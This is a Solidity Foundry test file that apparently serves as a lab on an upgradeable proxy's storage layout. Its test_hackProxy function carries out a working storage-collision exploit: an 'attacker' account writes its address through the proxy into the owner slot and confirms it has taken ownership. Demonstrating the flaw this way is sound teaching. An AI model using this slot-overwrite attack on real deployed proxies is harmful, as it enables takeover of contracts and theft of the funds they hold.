// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.7;

import "forge-std/Test.sol";
import "../src/contracts/lib/NomiconTest.sol";
import "../src/contracts/basic/TheAnswer.sol";
import "../src/contracts/basic/BasicProxy.sol";

contract AnswerProxyTest is NomiconTest {
    TheAnswer public answers;
    BasicUpgradeableProxy public proxy;
    address attacker;

    function setUp() public {
        answers = new TheAnswer();
        proxy = new BasicUpgradeableProxy(address(this));
        proxy.setImplementation(address(answers));

        vm.label(address(proxy), "Basic Upgradeable Proxy");
        vm.label(address(answers), "TheAnswer");

        attacker = account("attacker");
        vm.deal(attacker, 1 ether);
    }

    function test_callWithProxy() public {
        address(proxy).call(abi.encodeWithSignature("changeTheRealAnswer(uint256)", 42));
        address(proxy).call(abi.encodeWithSignature("getTheRealAnswer()"));
        answers.getTheRealAnswer();
    }

    function test_hackProxy() public {
        (, bytes memory data) = address(proxy).call(abi.encodeWithSignature("getAnswer1()"));

        address implementationAddress = address(uint160(uint256(bytes32(data))));
        assert(address(implementationAddress) == address(answers));
        console.log(implementationAddress, address(answers));

        // Hack the proxy
        vm.startPrank(attacker);

        (bool success,) =
            address(proxy).call(abi.encodeWithSignature("changeAnswer2(uint256)", uint256(uint160(attacker))));
        require(success, "Attack failed");

        (, bytes memory attackerData) = address(proxy).call(abi.encodeWithSignature("getAnswer2()"));
        address proxyOwner = proxy.owner();
        address attackerAddress = address(uint160(uint256(bytes32(attackerData))));
        assert(proxyOwner == address(attackerAddress));
        console.log(proxyOwner, attackerAddress);

        vm.stopPrank();
    }
}
